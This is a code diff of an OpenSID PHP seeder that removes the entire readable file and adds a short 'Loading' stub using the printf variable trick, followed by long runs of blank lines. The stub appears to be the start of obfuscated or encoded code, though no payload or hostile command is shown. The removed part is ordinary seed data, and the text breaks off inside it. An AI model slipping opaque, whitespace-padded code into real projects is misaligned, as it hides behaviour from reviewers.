@@ -1,1566 +1,569 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/seeders/Data_awal_seeder.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use App\Models\Config;
-use Illuminate\Support\Facades\DB;
-use App\Imports\KlasifikasiSuratImports;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Data_awal_seeder extends CI_Model
-{
-    public function __construct()
-    {
-        parent::__construct();
-        ini_set('memory_limit', '512M');
-        set_time_limit(5400);
-    }
 
-    public function run()
-    {
-        $db = DB::getDatabaseName();
-        // Error menggunakan Illuminate untuk alter database ini
-        // DB::statement("ALTER DATABASE {$db} CHARACTER SET utf8 COLLATE utf8_general_ci;");
-        $this->db->query(
-            "ALTER DATABASE `{$db}` CHARACTER SET utf8 COLLATE {$this->db->dbcollat};"
-        );
 
-        $this->load->helper('directory');
-        $directoryTable = 'donjo-app/models/migrations/struktur_tabel';
-        $migrations     = directory_map($directoryTable, 1);
-        // sort by name
-        usort($migrations, static fn ($a, $b) => strcmp($a, $b));
 
-        foreach ($migrations as $migrate) {
-            $migrateFile = require $directoryTable . DIRECTORY_SEPARATOR . $migrate;
-            $migrateFile->up();
-        }
 
-        $this->defaultConfig();
-        $this->addSettingModul();
-        $this->addDataMaster();
-    }
 
-    private function addSettingModul()
-    {
-        // id harus diset manual karena dipakai di code data awal
-        DB::table('setting_modul')->insert(
-            [
-                [
-                    'id'         => 2,
-                    'config_id'  => 1,
-                    'modul'      => 'Kependudukan',
-                    'slug'       => 'kependudukan',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-users',
-                    'urut'       => 30,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-users',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 3,
-                    'config_id'  => 1,
-                    'modul'      => 'Statistik',
-                    'slug'       => 'statistik',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-line-chart',
-                    'urut'       => 40,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-line-chart',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 4,
-                    'config_id'  => 1,
-                    'modul'      => 'Layanan Surat',
-                    'slug'       => 'layanan-surat',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-book',
-                    'urut'       => 50,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-book',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 5,
-                    'config_id'  => 1,
-                    'modul'      => 'Analisis',
-                    'slug'       => 'analisis',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => ' fa-check-square-o',
-                    'urut'       => 90,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-check-square-o',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 6,
-                    'config_id'  => 1,
-                    'modul'      => 'Bantuan',
-                    'slug'       => 'bantuan',
-                    'url'        => 'program_bantuan/clear',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-heart',
-                    'urut'       => 100,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-heart',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 7,
-                    'config_id'  => 1,
-                    'modul'      => 'Pertanahan',
-                    'slug'       => 'pertanahan',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-map-signs',
-                    'urut'       => 110,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-map-signs',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 9,
-                    'config_id'  => 1,
-                    'modul'      => 'Pemetaan',
-                    'slug'       => 'pemetaan',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-globe',
-                    'urut'       => 130,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-globe',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 10,
-                    'config_id'  => 1,
-                    'modul'      => 'Hubung Warga',
-                    'slug'       => 'hubung-warga',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-envelope',
-                    'urut'       => 140,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-envelope',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 11,
-                    'config_id'  => 1,
-                    'modul'      => 'Pengaturan',
-                    'slug'       => 'pengaturan',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-users',
-                    'urut'       => 150,
-                    'level'      => 1,
-                    'hidden'     => 1,
-                    'ikon_kecil' => 'fa-users',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 13,
-                    'config_id'  => 1,
-                    'modul'      => 'Admin Web',
-                    'slug'       => 'admin-web',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-desktop',
-                    'urut'       => 160,
-                    'level'      => 4,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-desktop',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 14,
-                    'config_id'  => 1,
-                    'modul'      => 'Layanan Mandiri',
-                    'slug'       => 'layanan-mandiri',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-inbox',
-                    'urut'       => 170,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-inbox',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 15,
-                    'config_id'  => 1,
-                    'modul'      => 'Sekretariat',
-                    'slug'       => 'sekretariat',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-archive',
-                    'urut'       => 60,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-archive',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 52,
-                    'config_id'  => 1,
-                    'modul'      => 'Informasi Publik',
-                    'slug'       => 'informasi-publik',
-                    'url'        => 'dokumen/clear',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-file-text',
-                    'urut'       => 4,
-                    'level'      => 4,
-                    'hidden'     => 0,
-                    'ikon_kecil' => '',
-                    'parent'     => 15,
-                ],
-                [
-                    'id'         => 200,
-                    'config_id'  => 1,
-                    'modul'      => 'Info [Desa]',
-                    'slug'       => 'info-desa',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-dashboard',
-                    'urut'       => 20,
-                    'level'      => 2,
-                    'hidden'     => 1,
-                    'ikon_kecil' => 'fa fa-home',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 201,
-                    'config_id'  => 1,
-                    'modul'      => 'Keuangan',
-                    'slug'       => 'keuangan',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-balance-scale',
-                    'urut'       => 80,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa-balance-scale',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 206,
-                    'config_id'  => 1,
-                    'modul'      => 'Kesehatan',
-                    'slug'       => 'kesehatan',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-heartbeat',
-                    'urut'       => 41,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-heartbeat',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 301,
-                    'config_id'  => 1,
-                    'modul'      => 'Buku Administrasi [Desa]',
-                    'slug'       => 'buku-administrasi-desa',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-paste',
-                    'urut'       => 70,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa fa-paste',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 312,
-                    'config_id'  => 1,
-                    'modul'      => 'Anjungan',
-                    'slug'       => 'anjungan',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-desktop',
-                    'urut'       => 180,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => '',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 337,
-                    'config_id'  => 1,
-                    'modul'      => 'Kehadiran',
-                    'slug'       => 'kehadiran',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-calendar-check-o',
-                    'urut'       => 41,
-                    'level'      => 0,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa-calendar-check-o',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 343,
-                    'config_id'  => 1,
-                    'modul'      => 'OpenDK',
-                    'slug'       => 'opendk',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-university',
-                    'urut'       => 124,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa-university',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 352,
-                    'config_id'  => 1,
-                    'modul'      => 'Satu Data',
-                    'slug'       => 'satu-data',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-globe',
-                    'urut'       => 180,
-                    'level'      => 1,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa-globe',
-                    'parent'     => 0,
-                ],
-                [
-                    'id'         => 354,
-                    'config_id'  => 1,
-                    'modul'      => 'Buku Tamu',
-                    'slug'       => 'buku-tamu',
-                    'url'        => '',
-                    'aktif'      => 1,
-                    'ikon'       => 'fa-book',
-                    'urut'       => 180,
-                    'level'      => 2,
-                    'hidden'     => 0,
-                    'ikon_kecil' => 'fa-book',
-                    'parent'     => 0,
-                ],
-            ]
-        );
-    }
 
-    private function addDataMaster()
-    {
-        DB::table('analisis_ref_state')->insert([
-            0 => ['id' => 1, 'nama' => 'Belum Entri / Pendataan'],
-            1 => ['id' => 2, 'nama' => 'Sedang Dalam Pendataan'],
-            2 => ['id' => 3, 'nama' => 'Selesai Entri / Pendataan'],
-        ]);
 
-        DB::table('analisis_ref_subjek')->insert([
-            ['id' => 1, 'subjek' => 'Penduduk'],
-            ['id' => 2, 'subjek' => 'Keluarga / KK'],
-            ['id' => 3, 'subjek' => 'Rumah Tangga'],
-            ['id' => 4, 'subjek' => 'Kelompok'],
-            ['id' => 5, 'subjek' => 'Desa'],
-            ['id' => 6, 'subjek' => 'Dusun'],
-            ['id' => 7, 'subjek' => 'Rukun Warga (RW)'],
-            ['id' => 8, 'subjek' => 'Rukun Tetangga (RT)'],
-        ]);
 
-        DB::table('analisis_tipe_indikator')->insert([
-            ['id' => 1, 'tipe' => 'Pilihan (Tunggal)'],
-            ['id' => 2, 'tipe' => 'Pilihan (Multivalue)'],
-            ['id' => 3, 'tipe' => 'sian Angka'],
-            ['id' => 4, 'tipe' => 'sian Tulisan'],
-        ]);
 
-        DB::table('ref_persil_kelas')->insert([
-            [
-                'id'    => 1,
-                'tipe'  => 'BASAH',
-                'kode'  => 'S-I',
-                'ndesc' => 'Persawahan Dekat dengan Pemukiman',
-            ],
-            [
-                'id'    => 2,
-                'tipe'  => 'BASAH',
-                'kode'  => 'S-II',
-                'ndesc' => 'Persawahan Agak Dekat dengan Pemukiman',
-            ],
-            [
-                'id'    => 3,
-                'tipe'  => 'BASAH',
-                'kode'  => 'S-III',
-                'ndesc' => 'Persawahan Jauh dengan Pemukiman',
-            ],
-            [
-                'id'    => 4,
-                'tipe'  => 'BASAH',
-                'kode'  => 'S-IV',
-                'ndesc' => 'Persawahan Sangat Jauh dengan Pemukiman',
-            ],
-            [
-                'id'    => 5,
-                'tipe'  => 'KERING',
-                'kode'  => 'D-I',
-                'ndesc' => 'Lahan Kering Dekat dengan Pemukiman',
-            ],
-            [
-                'id'    => 6,
-                'tipe'  => 'KERING',
-                'kode'  => 'D-II',
-                'ndesc' => 'Lahan Kering Agak Dekat dengan Pemukiman',
-            ],
-            [
-                'id'    => 7,
-                'tipe'  => 'KERING',
-                'kode'  => 'D-III',
-                'ndesc' => 'Lahan Kering Jauh dengan Pemukiman',
-            ],
-            [
-                'id'    => 8,
-                'tipe'  => 'KERING',
-                'kode'  => 'D-IV',
-                'ndesc' => 'Lahan Kering Sanga Jauh dengan Pemukiman',
-            ],
-        ]);
 
-        DB::table('ref_persil_mutasi')->insert([
-            [
-                'id'    => 1,
-                'nama'  => 'Jual Beli',
-                'ndesc' => 'Didapat dari proses Jual Beli',
-            ],
-            [
-                'id'    => 2,
-                'nama'  => 'Hibah',
-                'ndesc' => 'Didapat dari proses Hibah',
-            ],
-            [
-                'id'    => 3,
-                'nama'  => 'Waris',
-                'ndesc' => 'Didapat dari proses Waris',
-            ],
-        ]);
 
-        DB::table('ref_status_covid')->insert([
-            ['id' => 1, 'nama' => 'Kasus Suspek'],
-            ['id' => 2, 'nama' => 'Kasus Probable'],
-            ['id' => 3, 'nama' => 'Kasus Konfirmasi'],
-            ['id' => 4, 'nama' => 'Kontak Erat'],
-            ['id' => 5, 'nama' => 'Pelaku Perjalanan'],
-            ['id' => 6, 'nama' => 'Discarded'],
-            ['id' => 7, 'nama' => 'Selesai Isolasi'],
-        ]);
 
-        DB::table('ref_penduduk_bahasa')->insert([
-            ['id' => 1, 'nama' => 'Latin', 'inisial' => 'L'],
-            ['id' => 2, 'nama' => 'Daerah', 'inisial' => 'D'],
-            ['id' => 3, 'nama' => 'Arab', 'inisial' => 'A'],
-            ['id' => 4, 'nama' => 'Arab dan Latin', 'inisial' => 'AL'],
-            ['id' => 5, 'nama' => 'Arab dan Daerah', 'inisial' => 'AD'],
-            ['id' => 6, 'nama' => 'Arab, Latin dan Daerah', 'inisial' => 'ALD'],
-        ]);
 
-        DB::table('ref_penduduk_bidang')->insert([
-            ['id' => 1, 'nama' => 'Service Komputer'],
-            ['id' => 2, 'nama' => 'Operator Buldoser'],
-            ['id' => 3, 'nama' => 'Operator Komputer'],
-            ['id' => 4, 'nama' => 'Operator Genset'],
-            ['id' => 5, 'nama' => 'Service HP'],
-            ['id' => 6, 'nama' => 'Rias Pengantin'],
-            ['id' => 7, 'nama' => 'Design Grafis'],
-            ['id' => 8, 'nama' => 'Menjahit'],
-            ['id' => 9, 'nama' => 'Menulis'],
-            ['id' => 10, 'nama' => 'Reporter'],
-            ['id' => 11, 'nama' => 'Sosial Media Manajer'],
-            ['id' => 12, 'nama' => 'Manajemen Trainee'],
-            ['id' => 13, 'nama' => 'Kasir'],
-            ['id' => 14, 'nama' => 'HRD'],
-            ['id' => 15, 'nama' => 'Guru'],
-            ['id' => 16, 'nama' => 'Digital Marketing'],
-            ['id' => 17, 'nama' => 'Customer Services'],
-            ['id' => 18, 'nama' => 'Welder'],
-            ['id' => 19, 'nama' => 'Mekanik Alat Berat'],
-            ['id' => 20, 'nama' => 'Teknisi Listrik'],
-            ['id' => 21, 'nama' => 'Internet Marketing'],
-        ]);
 
-        DB::table('ref_penduduk_hamil')->insert([
-            ['id' => 1, 'nama' => 'Hamil'],
-            ['id' => 2, 'nama' => 'Tidak Hamil'],
-        ]);
 
-        DB::table('ref_penduduk_kursus')->insert([
-            ['id' => 1, 'nama' => 'Kursus Komputer'],
-            ['id' => 2, 'nama' => 'Kursus Menjahit'],
-            ['id' => 3, 'nama' => 'Pelatihan Kelistrikan'],
-            ['id' => 4, 'nama' => 'Kursus Mekanik Motor'],
-            ['id' => 5, 'nama' => 'Pelatihan Security'],
-            ['id' => 6, 'nama' => 'Kursus Otomotif'],
-            ['id' => 7, 'nama' => 'Kursus Bahasa Inggris'],
-            ['id' => 8, 'nama' => 'Kursus Tata Kecantikan Kulit'],
-            ['id' => 9, 'nama' => 'Kursus Megemudi'],
-            ['id' => 10, 'nama' => 'Kursus Tata Boga'],
-            ['id' => 11, 'nama' => 'Kursus Meubeler'],
-            ['id' => 12, 'nama' => 'Kursus Las'],
-            ['id' => 13, 'nama' => 'Kursus Sablon'],
-            ['id' => 14, 'nama' => 'Kursus Penerbangan'],
-            ['id' => 15, 'nama' => 'Kursus Desain Interior'],
-            ['id' => 16, 'nama' => 'Kursus Teknisi HP'],
-            ['id' => 17, 'nama' => 'Kursus Garment'],
-            ['id' => 18, 'nama' => 'Kursus Akupuntur'],
-            ['id' => 19, 'nama' => 'Kursus Senam'],
-            ['id' => 20, 'nama' => 'Kursus Pendidik PAUD'],
-            ['id' => 21, 'nama' => 'Kursus Baby Sitter'],
-            ['id' => 22, 'nama' => 'Kursus Desain Grafis'],
-            ['id' => 23, 'nama' => 'Kursus Bahasa Indonesia'],
-            ['id' => 24, 'nama' => 'Kursus Photografi'],
-            ['id' => 25, 'nama' => 'Kursus Expor Impor'],
-            ['id' => 26, 'nama' => 'Kursus Jurnalistik'],
-            ['id' => 27, 'nama' => 'Kursus Bahasa Arab'],
-            ['id' => 28, 'nama' => 'Kursus Bahasa Jepang'],
-            ['id' => 29, 'nama' => 'Kursus Anak Buah Kapal'],
-            ['id' => 30, 'nama' => 'Kursus Refleksi'],
-            ['id' => 31, 'nama' => 'Kursus Akupuntur'],
-            ['id' => 32, 'nama' => 'Kursus Perhotelan'],
-            ['id' => 33, 'nama' => 'Kursus Tata Rias'],
-            ['id' => 34, 'nama' => 'Kursus Administrasi Perkantoran'],
-            ['id' => 35, 'nama' => 'Kursus Broadcasting'],
-            ['id' => 36, 'nama' => 'Kursus Kerajinan Tangan'],
-            ['id' => 37, 'nama' => 'Kursus Sosial Media Marketing'],
-            ['id' => 38, 'nama' => 'Kursus Internet Marketing'],
-            ['id' => 39, 'nama' => 'Kursus Sekretaris'],
-            ['id' => 40, 'nama' => 'Kursus Perpajakan'],
-            ['id' => 41, 'nama' => 'Kursus Publik Speaking'],
-            ['id' => 42, 'nama' => 'Kursus Publik Relation'],
-            ['id' => 43, 'nama' => 'Kursus Batik'],
-            ['id' => 44, 'nama' => 'Kursus Pengobatan Tradisional'],
-        ]);
 
-        DB::table('ref_peristiwa')->insert([
-            ['id' => 1, 'nama' => 'Lahir'],
-            ['id' => 2, 'nama' => 'Mati'],
-            ['id' => 3, 'nama' => 'Pindah Keluar'],
-            ['id' => 4, 'nama' => 'Hilang'],
-            ['id' => 5, 'nama' => 'Pindah Masuk'],
-            ['id' => 6, 'nama' => 'Pergi'],
-        ]);
 
-        DB::table('ref_pindah')->insert([
-            ['id' => 1, 'nama' => 'Pindah keluar Desa/Kelurahan'],
-            ['id' => 2, 'nama' => 'Pindah keluar Kecamatan'],
-            ['id' => 3, 'nama' => 'Pindah keluar Kabupaten/Kota'],
-            ['id' => 4, 'nama' => 'Pindah keluar Provinsi'],
-        ]);
 
-        DB::table('tweb_cacat')->insert([
-            ['id' => 1, 'nama' => 'CACAT FISIK'],
-            ['id' => 2, 'nama' => 'CACAT NETRA/BUTA'],
-            ['id' => 3, 'nama' => 'CACAT RUNGU/WICARA'],
-            ['id' => 4, 'nama' => 'CACAT MENTAL/JIWA'],
-            ['id' => 5, 'nama' => 'CACAT FISIK DAN MENTAL'],
-            ['id' => 6, 'nama' => 'CACAT LAINNYA'],
-            ['id' => 7, 'nama' => 'TIDAK CACAT'],
-        ]);
 
-        DB::table('tweb_cara_kb')->insert([
-            ['id' => 1, 'nama' => 'Pil', 'sex' => 2],
-            ['id' => 2, 'nama' => 'IUD', 'sex' => 2],
-            ['id' => 3, 'nama' => 'Suntik', 'sex' => 2],
-            ['id' => 4, 'nama' => 'Kondom', 'sex' => 1],
-            ['id' => 5, 'nama' => 'Susuk KB', 'sex' => 2],
-            ['id' => 6, 'nama' => 'Sterilisasi Wanita', 'sex' => 2],
-            ['id' => 7, 'nama' => 'Sterilisasi Pria', 'sex' => 1],
-            ['id' => 99, 'nama' => 'Lainnya', 'sex' => 3],
-        ]);
 
-        DB::table('tweb_golongan_darah')->insert([
-            ['id' => 1, 'nama' => 'A'],
-            ['id' => 2, 'nama' => 'B'],
-            ['id' => 3, 'nama' => 'AB'],
-            ['id' => 4, 'nama' => 'O'],
-            ['id' => 5, 'nama' => 'A+'],
-            ['id' => 6, 'nama' => 'A-'],
-            ['id' => 7, 'nama' => 'B+'],
-            ['id' => 8, 'nama' => 'B-'],
-            ['id' => 9, 'nama' => 'AB+'],
-            ['id' => 10, 'nama' => 'AB-'],
-            ['id' => 11, 'nama' => 'O+'],
-            ['id' => 12, 'nama' => 'O-'],
-            ['id' => 13, 'nama' => 'TIDAK TAHU'],
-        ]);
 
-        DB::table('tweb_penduduk_agama')->insert([
-            ['id' => 1, 'nama' => 'ISLAM'],
-            ['id' => 2, 'nama' => 'KRISTEN'],
-            ['id' => 3, 'nama' => 'KATHOLIK'],
-            ['id' => 4, 'nama' => 'HINDU'],
-            ['id' => 5, 'nama' => 'BUDHA'],
-            ['id' => 6, 'nama' => 'KHONGHUCU'],
-            ['id' => 7, 'nama' => 'Kepercayaan Terhadap Tuhan YME / Lainnya'],
-        ]);
-        DB::table('tweb_penduduk_asuransi')->insert([
-            ['id' => 1, 'nama' => 'Tidak/Belum Punya'],
-            ['id' => 2, 'nama' => 'BPJS Penerima Bantuan Iuran'],
-            ['id' => 3, 'nama' => 'BPJS Non Penerima Bantuan Iuran'],
-            ['id' => 99, 'nama' => 'Asuransi Lainnya'],
-        ]);
 
-        DB::table('tweb_penduduk_hubungan')->insert([
-            ['id' => 1, 'nama' => 'KEPALA KELUARGA'],
-            ['id' => 2, 'nama' => 'SUAMI'],
-            ['id' => 3, 'nama' => 'ISTRI'],
-            ['id' => 4, 'nama' => 'ANAK'],
-            ['id' => 5, 'nama' => 'MENANTU'],
-            ['id' => 6, 'nama' => 'CUCU'],
-            ['id' => 7, 'nama' => 'ORANGTUA'],
-            ['id' => 8, 'nama' => 'MERTUA'],
-            ['id' => 9, 'nama' => 'FAMILI LAIN'],
-            ['id' => 10, 'nama' => 'PEMBANTU'],
-            ['id' => 11, 'nama' => 'LAINNYA'],
-        ]);
-        DB::table('tweb_penduduk_kawin')->insert([
-            ['id' => 1, 'nama' => 'BELUM KAWIN'],
-            ['id' => 2, 'nama' => 'KAWIN'],
-            ['id' => 3, 'nama' => 'CERAI HIDUP'],
-            ['id' => 4, 'nama' => 'CERAI MATI'],
-        ]);
 
-        DB::table('tweb_penduduk_pekerjaan')->insert([
-            ['id' => 1, 'nama' => 'BELUM/TIDAK BEKERJA'],
-            ['id' => 2, 'nama' => 'MENGURUS RUMAH TANGGA'],
-            ['id' => 3, 'nama' => 'PELAJAR/MAHASISWA'],
-            ['id' => 4, 'nama' => 'PENSIUNAN'],
-            ['id' => 5, 'nama' => 'PEGAWAI NEGERI SIPIL (PNS)'],
-            ['id' => 6, 'nama' => 'TENTARA NASIONAL INDONESIA (TNI)'],
-            ['id' => 7, 'nama' => 'KEPOLISIAN RI (POLRI)'],
-            ['id' => 8, 'nama' => 'PERDAGANGAN'],
-            ['id' => 9, 'nama' => 'PETANI/PEKEBUN'],
-            ['id' => 10, 'nama' => 'PETERNAK'],
-            ['id' => 11, 'nama' => 'NELAYAN/PERIKANAN'],
-            ['id' => 12, 'nama' => 'INDUSTRI'],
-            ['id' => 13, 'nama' => 'KONSTRUKSI'],
-            ['id' => 14, 'nama' => 'TRANSPORTASI'],
-            ['id' => 15, 'nama' => 'KARYAWAN SWASTA'],
-            ['id' => 16, 'nama' => 'KARYAWAN BUMN'],
-            ['id' => 17, 'nama' => 'KARYAWAN BUMD'],
-            ['id' => 18, 'nama' => 'KARYAWAN HONORER'],
-            ['id' => 19, 'nama' => 'BURUH HARIAN LEPAS'],
-            ['id' => 20, 'nama' => 'BURUH TANI/PERKEBUNAN'],
-            ['id' => 21, 'nama' => 'BURUH NELAYAN/PERIKANAN'],
-            ['id' => 22, 'nama' => 'BURUH PETERNAKAN'],
-            ['id' => 23, 'nama' => 'PEMBANTU RUMAH TANGGA'],
-            ['id' => 24, 'nama' => 'TUKANG CUKUR'],
-            ['id' => 25, 'nama' => 'TUKANG LISTRIK'],
-            ['id' => 26, 'nama' => 'TUKANG BATU'],
-            ['id' => 27, 'nama' => 'TUKANG KAYU'],
-            ['id' => 28, 'nama' => 'TUKANG SOL SEPATU'],
-            ['id' => 29, 'nama' => 'TUKANG LAS/PANDAI BESI'],
-            ['id' => 30, 'nama' => 'TUKANG JAHIT'],
-            ['id' => 31, 'nama' => 'TUKANG GIGI'],
-            ['id' => 32, 'nama' => 'PENATA RIAS'],
-            ['id' => 33, 'nama' => 'PENATA BUSANA'],
-            ['id' => 34, 'nama' => 'PENATA RAMBUT'],
-            ['id' => 35, 'nama' => 'MEKANIK'],
-            ['id' => 36, 'nama' => 'SENIMAN'],
-            ['id' => 37, 'nama' => 'TABIB'],
-            ['id' => 38, 'nama' => 'PARAJI'],
-            ['id' => 39, 'nama' => 'PERANCANG BUSANA'],
-            ['id' => 40, 'nama' => 'PENTERJEMAH'],
-            ['id' => 41, 'nama' => 'IMAM MASJID'],
-            ['id' => 42, 'nama' => 'PENDETA'],
-            ['id' => 43, 'nama' => 'PASTOR'],
-            ['id' => 44, 'nama' => 'WARTAWAN'],
-            ['id' => 45, 'nama' => 'USTADZ/MUBALIGH'],
-            ['id' => 46, 'nama' => 'JURU MASAK'],
-            ['id' => 47, 'nama' => 'PROMOTOR ACARA'],
-            ['id' => 48, 'nama' => 'ANGGOTA DPR-RI'],
-            ['id' => 49, 'nama' => 'ANGGOTA DPD'],
-            ['id' => 50, 'nama' => 'ANGGOTA BPK'],
-            ['id' => 51, 'nama' => 'PRESIDEN'],
-            ['id' => 52, 'nama' => 'WAKIL PRESIDEN'],
-            ['id' => 53, 'nama' => 'ANGGOTA MAHKAMAH KONSTITUSI'],
-            ['id' => 54, 'nama' => 'ANGGOTA KABINET KEMENTERIAN'],
-            ['id' => 55, 'nama' => 'DUTA BESAR'],
-            ['id' => 56, 'nama' => 'GUBERNUR'],
-            ['id' => 57, 'nama' => 'WAKIL GUBERNUR'],
-            ['id' => 58, 'nama' => 'BUPATI'],
-            ['id' => 59, 'nama' => 'WAKIL BUPATI'],
-            ['id' => 60, 'nama' => 'WALIKOTA'],
-            ['id' => 61, 'nama' => 'WAKIL WALIKOTA'],
-            ['id' => 62, 'nama' => 'ANGGOTA DPRD PROVINSI'],
-            ['id' => 63, 'nama' => 'ANGGOTA DPRD KABUPATEN/KOTA'],
-            ['id' => 64, 'nama' => 'DOSEN'],
-            ['id' => 65, 'nama' => 'GURU'],
-            ['id' => 66, 'nama' => 'PILOT'],
-            ['id' => 67, 'nama' => 'PENGACARA'],
-            ['id' => 68, 'nama' => 'NOTARIS'],
-            ['id' => 69, 'nama' => 'ARSITEK'],
-            ['id' => 70, 'nama' => 'AKUNTAN'],
-            ['id' => 71, 'nama' => 'KONSULTAN'],
-            ['id' => 72, 'nama' => 'DOKTER'],
-            ['id' => 73, 'nama' => 'BIDAN'],
-            ['id' => 74, 'nama' => 'PERAWAT'],
-            ['id' => 75, 'nama' => 'APOTEKER'],
-            ['id' => 76, 'nama' => 'PSIKIATER/PSIKOLOG'],
-            ['id' => 77, 'nama' => 'PENYIAR TELEVISI'],
-            ['id' => 78, 'nama' => 'PENYIAR RADIO'],
-            ['id' => 79, 'nama' => 'PELAUT'],
-            ['id' => 80, 'nama' => 'PENELITI'],
-            ['id' => 81, 'nama' => 'SOPIR'],
-            ['id' => 82, 'nama' => 'PIALANG'],
-            ['id' => 83, 'nama' => 'PARANORMAL'],
-            ['id' => 84, 'nama' => 'PEDAGANG'],
-            ['id' => 85, 'nama' => 'PERANGKAT DESA'],
-            ['id' => 86, 'nama' => 'KEPALA DESA'],
-            ['id' => 87, 'nama' => 'BIARAWATI'],
-            ['id' => 88, 'nama' => 'WIRASWASTA'],
-            ['id' => 89, 'nama' => 'LAINNYA'],
-        ]);
 
-        DB::table('tweb_penduduk_pendidikan')->insert([
-            ['id' => 1, 'nama' => 'BELUM MASUK TK/KELOMPOK BERMAIN'],
